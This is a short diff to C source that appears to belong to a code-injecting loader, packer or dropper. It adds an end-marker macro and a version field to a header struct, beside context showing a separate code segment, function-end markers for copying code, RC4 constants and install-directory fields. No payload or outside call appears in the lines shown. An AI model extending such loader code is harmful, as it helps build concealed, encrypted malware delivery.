@@ -6,10 +6,12 @@
 #pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
+#define END_MARKER(ptr) do { memcpy(ptr, "<E>\0", 4); ptr += 4; } while(0)
 #define END_OF(x) #x ## "_End"
 #define FUNCTION_END_DECL(x) void x ## _End()
 #define FUNCTION_END(x) FUNCTION_END_DECL(x) { char * y = END_OF(x); return; }
 #define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);
+
 
 #define RC4KEYLEN 64
 #define SBOX_SIZE 255
@@ -124,6 +126,7 @@ typedef  __declspec(align(4)) struct _data_section_header
 
 	CHAR instDir[10];
 	CHAR fPrefix[8];
+	CHAR version[20];
 } DataSectionHeader;
 
 typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
